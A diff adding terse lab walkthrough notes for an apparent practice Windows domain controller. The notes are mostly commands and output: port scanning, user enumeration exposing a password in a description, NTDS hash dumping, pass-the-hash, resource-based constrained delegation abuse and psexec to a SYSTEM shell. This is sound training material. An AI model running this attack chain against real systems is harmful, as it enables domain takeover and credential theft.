@@ -1,0 +1,104 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.204.175 > Resourced.txt
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-28 07:04:53Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-04-28T07:06:20+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=ResourceDC.resourced.local
+| Issuer: commonName=ResourceDC.resourced.local
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-27T07:01:53
+| Not valid after:  2026-10-27T07:01:53
+| MD5:   4c1c:279d:cae5:9237:f24c:fc2b:a544:0241
+|_SHA-1: 8d0e:e16c:793f:be92:45f4:2091:ef87:5947:9b47:9b0c
+| rdp-ntlm-info: 
+|   Target_Name: resourced
+|   NetBIOS_Domain_Name: resourced
+|   NetBIOS_Computer_Name: RESOURCEDC
+|   DNS_Domain_Name: resourced.local
+|   DNS_Computer_Name: ResourceDC.resourced.local
+|   DNS_Tree_Name: resourced.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-04-28T07:05:40+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49708/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+$ enum4linux 192.168.204.175
+Domain Name: resourced                     
+Domain Sid: S-1-5-21-537427935-490066102-1511301751
+Administrator
+Guest
+krbtgt
+resourced
+M.Mason   
+K.Keen   
+L.Livingstone 
+J.Johnson
+V.Ventz:HotelCalifornia194!
+S.Swanson
+P.Parker
+R.Robinson
+D.Durant
+G.Goldberg
+
+rpcclient $> queryuser 0x453
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[M.Mason] rid:[0x44f]  # Ex IT admin
+user:[K.Keen] rid:[0x450]  # Frontend Developer
+user:[L.Livingstone] rid:[0x451] # sysadmin 
+user:[J.Johnson] rid:[0x452]
+user:[V.Ventz] rid:[0x453] # New-hired, reminder: HotelCalifornia194!
+user:[S.Swanson] rid:[0x454]
+user:[P.Parker] rid:[0x455]
+user:[R.Robinson] rid:[0x456]  # Database Admin
+user:[D.Durant] rid:[0x457]
+user:[G.Goldberg] rid:[0x458]
+
+$ nxc smb 192.168.204.175 -u 'V.Ventz' -p 'HotelCalifornia194!'
+SMB         192.168.204.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!
+
+rm -f /home/alan/.nxc/workspaces/default/rdp.db # need run this before nxc rdp
+$ nxc rdp 192.168.204.175 -u 'V.Ventz' -p 'HotelCalifornia194!'
+RDP         192.168.204.175 3389   RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!
+smbclient in with V.Ventz credential.
+found ntds.dit, ntds.jfm, SYSTEM, SECURITY. Get all of them.
+$ impacket-secretsdump -ntds ntds.dit  -system SYSTEM -security SECURITY local
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+
+Use bloodhound to known that L.Livingstone is tier 0 user.
+$ nxc winrm 192.168.204.175 -u L.Livingstone -H "19a3a7550ce8c505c2d46b5e39d6f808"
+WINRM       192.168.204.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
+
+impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.204.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACKER$' -computer-pass 'Attacker123'
+$ impacket-rbcd -action write -dc-ip 192.168.204.175 -delegate-from 'ATTACKER$' -delegate-to 'RESOURCEDC$' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced.local/l.livingstone
+$ impacket-getST -spn cifs/resourcedc.resourced.local resourced.local/ATTACKER$:'Attacker123' -impersonate Administrator -dc-ip 192.168.204.175
+export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+add 192.168.204.175  resourcedc.resourced.local to /etc/hosts
+sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.204.175
+
+get SYSTEM shell
+
